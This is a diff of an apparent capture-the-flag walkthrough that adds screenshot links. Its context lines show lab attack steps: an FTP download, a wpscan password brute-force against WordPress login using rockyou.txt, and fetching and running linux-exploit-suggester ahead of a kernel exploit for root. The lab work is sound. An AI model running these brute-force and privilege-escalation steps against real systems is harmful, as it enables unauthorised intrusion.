@@ -46,7 +46,7 @@ Open ports:
 * **80/tcp** – HTTP
 * **12380/tcp** – Apache HTTPD 2.4.18
 
-![nmap](images\nmap.png)
+![nmap](images/nmap.png)
 
 ---
 
@@ -79,6 +79,7 @@ ftp <TARGET_IP>
 ls
 get note
 ```
+![FTP](images/ftp.png)
 
 The note hinted toward a payload-based attack, suggesting further exploitation paths.
 
@@ -100,6 +101,8 @@ Interesting paths discovered:
 
 The `/blogblog` page revealed a **WordPress** installation.
 
+![Nikto](images/nikto.png)
+
 ---
 
 ## ⚔️ Exploitation (WordPress)
@@ -115,6 +118,7 @@ wpscan --url https://<TARGET_IP>:12380/blogblog \
 --passwords rockyou.txt \
 --password-attack wp-login
 ```
+![Exploitation](images/exp.png)
 
 ✅ Valid credentials found:
 
@@ -157,6 +161,7 @@ wget https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master
 chmod +x linux-exploit-suggester.sh
 ./linux-exploit-suggester.sh
 ```
+![ROOTED](images/root.png)
 
 A suitable kernel exploit was identified and used to gain **root access**.
 
